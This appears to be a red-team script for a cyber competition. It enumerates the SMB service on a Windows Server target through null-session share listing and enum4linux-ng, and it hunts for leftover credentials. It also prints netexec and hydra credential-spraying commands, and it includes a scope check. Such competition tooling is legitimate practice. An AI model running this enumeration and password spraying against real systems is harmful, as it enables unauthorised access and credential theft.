#!/usr/bin/env bash
# ============================================================
# 03_smb_sunflower.sh — target: sunflower.misty.view (.51)
# Windows Server 2019. Scored service: SMB.
# ============================================================
# Usage:
#   TARGET_TEAM=07 ./03_smb_sunflower.sh
#
# Requires: smbclient, enum4linux-ng, netexec/crackmapexec, hydra
# ============================================================
set -euo pipefail
cd "$(dirname "$0")"
source ./scope.env

TARGET="$HOST_SUNFLOWER"
assert_in_scope "$TARGET"
OUT="$OUTDIR/smb_sunflower"
mkdir -p "$OUT"

echo "=== SMB enumeration: $TARGET ==="

# 1. Anonymous/null session share listing
echo "[*] Listing shares (null session)..."
smbclient -L "//$TARGET" -N | tee "$OUT/shares_null.txt" || true

# 2. enum4linux-ng for users/shares/policy via null session
if command -v enum4linux-ng >/dev/null 2>&1; then
    echo "[*] Running enum4linux-ng..."
    enum4linux-ng -A "$TARGET" -oY "$OUT/enum4linux.yaml" || true
else
    echo "[!] enum4linux-ng not installed (apt install enum4linux-ng). Skipping."
fi

# 3. Build userlist from packet's authorized users for sunflower
printf "%s\n" "${USERS_SUNFLOWER[@]}" > "$OUT/userlist.txt"
echo "[*] Userlist written to $OUT/userlist.txt (Administrator, jalapeno, coffeebean, pepperpult)"

# 4. Known-leftover-artifact hunt: packet says "artifacts from the previous war
#    are left over in the machine" — worth checking world-readable shares for
#    old creds/config files before brute-forcing anything.
if smbclient -L "//$TARGET" -N 2>/dev/null | grep -qiE '\bDisk\b'; then
    echo "[*] Found disk shares — listing files recursively on any anonymously-readable ones is often where leftover creds live."
    echo "    Try: smbclient //$TARGET/<ShareName> -N -c 'recurse ON; ls'"
fi

cat <<'EOF'

[*] Opt-in credential spray (after you have a userlist and a SMALL
    wordlist — e.g. the comp's released default creds):

    netexec smb TARGET -u ./userlist.txt -p ./wordlists/comp_default_creds.txt --continue-on-success

  or with hydra:

    hydra -L OUT/userlist.txt -P ./wordlists/comp_default_creds.txt \
          smb://TARGET -t 4

[*] Once you have ANY valid cred, re-run enumeration authenticated —
    it reveals far more (shares, spooler, password policy, etc.):

    netexec smb TARGET -u 'jalapeno' -p 'PASSWORD' --shares --users

EOF

echo "=== Done. Review $OUT/ ==="
